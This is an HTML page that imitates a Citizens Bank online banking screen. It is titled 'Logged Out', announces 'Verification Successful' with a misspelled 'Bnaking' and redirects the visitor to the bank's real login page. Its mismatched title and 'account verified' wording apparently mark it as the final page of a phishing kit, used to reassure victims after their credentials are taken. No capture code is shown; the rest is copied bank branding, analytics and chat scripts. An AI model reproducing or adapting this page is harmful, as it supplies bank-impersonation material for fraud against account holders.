







<!DOCTYPE html>






               
                
                
                
                








    
    
    

    
    
    

    

    






         





<!DOCTYPE html>
<html lang="en-US">
<head>


<!-- // removing loginnew-wait.jsp from search results requirement OLB-7248  -->

<!-- // removing logout.jsp from search results requirement OLB-4998  -->









<!-- // removing logout.jsp from search results requirement OLB-4998  -->


        <meta name="robots" content="noindex,nofollow" />


<!-- // removing loginnew-wait.jsp from search results requirement OLB-7248  -->

    <link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon.png" rel="apple-touch-icon">
    <link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76">
    <link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120">
    <link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152">
    <link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon-180x180.png" rel="apple-touch-icon" sizes="180x180">
    <link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/icon-hires.png" rel="icon" sizes="192x192">
    <link href="https://www3.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/icon-normal.png" rel="icon" sizes="128x128">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta http-equiv="refresh" content="5;url=https://www4.citizensbankonline.com/efs/servlet/efs/login.jsp">
    <!--Exclude Ensighten library incase skipEnsighten is "true"-->
    
    <script type="text/javascript">
        var timeStamp = new Date().toString();
        var pageURL = ((window.frames && window.frames.length) ? window.frames[0].location.href : window.location.href);
        var pageName = ((window.document && window.document.title) ? window.document.title : "not available");
        var digitalData = {
            "sessionInformation": {
                "zipCode": "",
                "country": "",
                "city": "",
                "state": "",
                "timeStamp": timeStamp
            },
            "customerAttributes": {
                "CISKey": "",
                "DirectoryID": ""
            },
            "contentInteractions": {
                "siteName": "OLB",
                "siteSection": "Authenticated",
                "pageName": pageName,
                "pageURL": pageURL,
                "pageType": "Legacy"
            }
        };
        if (typeof(parent.Bootstrapper) !== "undefined" && parent.Bootstrapper.ensEvent && parent.Bootstrapper.ensEvent.trigger){
            if(window.frames && window.frames.length) parent.Bootstrapper.ensEvent.trigger("OLBURLChangeFrame"); else parent.Bootstrapper.ensEvent.trigger("OLBURLChangeWindow");
        }
    </script>
    <script type="text/javascript" src="//nexus.ensighten.com/citizensbank/olbprod/Bootstrap.js"></script>
    

    <!-- BEGIN LivePerson Monitor -->
    <script type="text/javascript">
        // Production environment check from olb-web-ui ./js/mv/_onlinebanking/config.js
        var isProductionEnvironment = !!document.location.hostname.match(/(?:^.*\.|^)citizensbankonline.com/);
        // Set LivePerson account number based on environment
        var lpAccountNumber = isProductionEnvironment ? '83789770' : '89632304';

        window.lpTag = window.lpTag || {}, 'undefined' == typeof window.lpTag._tagCount ? (window.lpTag = { wl: lpTag.wl || null, scp: lpTag.scp || null, 
        site: lpAccountNumber || '', section: lpTag.section || '', tagletSection: lpTag.tagletSection || null, autoStart: lpTag.autoStart !== !1, ovr: lpTag.ovr || 
        {}, _v: '1.10.0', _tagCount: 1, protocol: 'https:', events: { bind: function (t, e, i) { lpTag.defer(function () { lpTag.events.bind(t, e, i) }, 0) }, 
        trigger: function (t, e, i) { lpTag.defer(function () { lpTag.events.trigger(t, e, i) }, 1) } }, defer: function (t, e) { 0 === e ? (this._defB = this._defB || [], 
        this._defB.push(t)) : 1 === e ? (this._defT = this._defT || [], this._defT.push(t)) : (this._defL = this._defL || [], this._defL.push(t)) }, 
        load: function (t, e, i) { var n = this; setTimeout(function () { n._load(t, e, i) }, 0) }, _load: function (t, e, i) { var n = t; t || 
        (n = this.protocol + '//' + (this.ovr && this.ovr.domain ? this.ovr.domain : 'lptag.liveperson.net') + '/tag/tag.js?site=' + this.site); 
        var o = document.createElement('script'); o.setAttribute('charset', e ? e : 'UTF-8'), i && o.setAttribute('id', i), o.setAttribute('src', n), 
        document.getElementsByTagName('head').item(0).appendChild(o) }, init: function () { this._timing = this._timing || {}, 
        this._timing.start = (new Date).getTime(); var t = this; window.attachEvent ? window.attachEvent('onload', function () { t._domReady('domReady') }) : 
        (window.addEventListener('DOMContentLoaded', function () { t._domReady('contReady') }, !1), window.addEventListener('load', function () 
        { t._domReady('domReady') }, !1)), 'undefined' === typeof window._lptStop && this.load() }, start: function () { this.autoStart = !0 }, _domReady: function (t)
        { this.isDom || (this.isDom = !0, this.events.trigger('LPT', 'DOM_READY', { t: t })), this._timing[t] = (new Date).getTime() }, vars: lpTag.vars || [], 
        dbs: lpTag.dbs || [], ctn: lpTag.ctn || [], sdes: lpTag.sdes || [], hooks: lpTag.hooks || [], identities: lpTag.identities || [], ev: lpTag.ev || [] }, 
        lpTag.init()) : window.lpTag._tagCount += 1;
    </script>
    <!-- END LivePerson Monitor -->


   





<link rel="stylesheet" href="https://www3.citizensbankonline.com/efs/efs/jsp-ns/inc/css/jquery-ui-1.10.3.custom.min.css">
<link rel="stylesheet" href="https://www3.citizensbankonline.com/efs/efs/jsp-ns/inc/css/normalize.css">
<link rel="stylesheet" href="https://www3.citizensbankonline.com/efs/efs/jsp-ns/inc/css/main.css">
<link rel="stylesheet" href="https://www3.citizensbankonline.com/efs/efs/jsp-ns/inc/css/flows.css">
<link rel="stylesheet" href="https://www3.citizensbankonline.com/efs/efs/jsp-ns/inc/css/ad-containers.css">

<script src="https://www3.citizensbankonline.com/efs/efs/jsp-ns/scripts/modernizr-2.6.2.min.js"></script>

<script>window.jQuery || document.write('<script src="https://www3.citizensbankonline.com/efs/efs/jsp-ns/scripts/jquery-1.9.1.min.js"><\/script>')</script>
<script src="https://www3.citizensbankonline.com/efs/efs/jsp-ns/scripts/plugins.js"></script>


<script src="https://www3.citizensbankonline.com/efs/efs/jsp-ns/scripts/placeholders.min.js"></script>


<!--[if lt IE 9]>
<script src="/efs/efs/jsp-ns/scripts/html5shiv.js"></script>
<![endif]-->





<!--[if IE]>
<style type='text/css'>
form select#SavedUserID {
    width : 200px;
}
</style>
<![endif]-->



   <title>Logged Out</title>
   
   <style type="text/css">
        body {
            font-size: 1em;
            line-height: 1.4;
            font-family: "CitiSans", Helvetica, Arial, sans-serif;
            color: #444;
        }
    
   </style>
     
</head>
<body class="responsive-enabled">
   


<script type="text/javascript" src="https://www3.citizensbankonline.com/efs/efs/js/tealeaf.js"></script>
<!-- begin CITIZENS BANK Hosted Header -->
 

    <style>
        .account-section-title.checkmark h1 { padding: 0px 0px 5px 28px !important; }
        .mobile-alert-dot {min-width: 22px; min-height: 22px; width: auto; height: auto; max-width: 50px; max-height: 50px; padding: 5px; }
    </style>

    <!-- htmlContainer PREFIX -->
    <div class="citizens-header-footer">
        <div id="page-header" class="page-header">
            <!-- inc-header.html START -->
            <div class="topshadow"></div>
            <div class="centered-content clearfix">

                <a href="#" class="page-logo" tabindex="1">
                    <!-- Display the brand logo for either citizens one or citizen bank customers -->
                    <img border="0" alt="Citizens Bank" width="203" height="25" src="https://www3.citizensbankonline.com/efs/hhf/img/CTZ_Green-01.png">
                </a>
                <div id="header-navigation-container"></div>

            </div>
            <!-- inc-header.html END -->
        </div>
    </div>
    <!-- htmlContainer SUFFIX -->


</div>
<!-- end CITIZENS BANK Hosted Header -->




<div id="page-container" class="page-container">
    <div class="centered-content clearfix">
        <section id="top-content" class="page-region top-content">
        
        </section>
        <section id="main-container" class="main-container two-col layout-2-1 clearfix">

            <!-- =================
            MAIN CONTENT AREA START
            ================= -->
            <section id="main-content" class="page-region main-content">
  
 
   <div class="account-table account-table-full final-flow-screen">
      <div class="account-table-content">
         <div class="account-content-container">
            <header class="darkgreen-top">
               <h1>Verification Successful</h1>
            </header>
            <div class="account-table-body">
               <header class="account-section-title clearfix checkmark">
                  <h1>Your Citizens Online Bnaking account has been verified. You'll be redirected to the login page.</h1>
               </header>
               <section class="account-section no-form">
               
                   
                   
                   <form class="spacer" id="frmLogout">
                       <input type="hidden" name="CSRF_TOKEN" value="7ZC5-7RUF-1RAD-J6WX-CIN2-B3IN-U6MX-BSLA"/>
                       <input type="hidden" name="sessionid" value="Q-hyJYn66XRBUoAcnpiUYCI" />
                      <!--Return to the login page with the right branding and query param-->
                      <a id="returntologin" class="button arrow" href="https://www4.citizensbankonline.com/">Return to Login</a>
                   </form>
               
                   <div class="ad-container two-ad-row clearfix" style="margin:20px auto 10px;">
                        <table width="95%" style="padding : auto .5%">
                        <tr>
                          <td width="46.5%">
                            
                          </td>
                        
                          <td width="46.5%">
                            
                          </td>
                        </tr>
                        </table>
           </div>
               </section>

            </div>
         </div>
      </div>
   </div>


   


        </section> 
    </div> 
</div> 





<!DOCTYPE html>



<!-- begin CITIZENS BANK Hosted Footer -->
<div class="citizens-footer"></div>
<script src="https://www3.citizensbankonline.com/efs/hhf/js/citizensHeaderFooter-citizensns42588.js"></script>
 
<!-- end CITIZENS BANK Hosted Footer -->






<script type="text/javascript" >var _cf = _cf || []; _cf.push(['_setFsp', true]);  _cf.push(['_setBm', true]);  _cf.push(['_setAu', '/content/930e113327rn2365aa3b7b98b0447e8d']); </script><script type="text/javascript"  src="/content/930e113327rn2365aa3b7b98b0447e8d"></script></body>
</html>



 <!--  End Main Container -->
    
   <script src="https://www3.citizensbankonline.com/efs/efs/jsp-ns/scripts/common.js"></script>
   
   <script type="text/javascript"> 
      $(document).ready(function() {
          
          $("#returntologin").click(function() {
                window.parent.location.href = "https://www4.citizensbankonline.com/";
            });
          
         $("#main-content").addClass("full-width");
         $("#returntologin").focus();
         
         setTimeout(function() {
             $.ajax({
                  url: "/efs/servlet/efs/inc/session-logout.jsp",
                  context: document.body
                });
         }, 200);
         
      });
   </script>

    
    <img src="" style="height:1px;width:1px;border:0" />

    
    <img src="" style="height:1px;width:1px;border:0" />
</body>
</html>


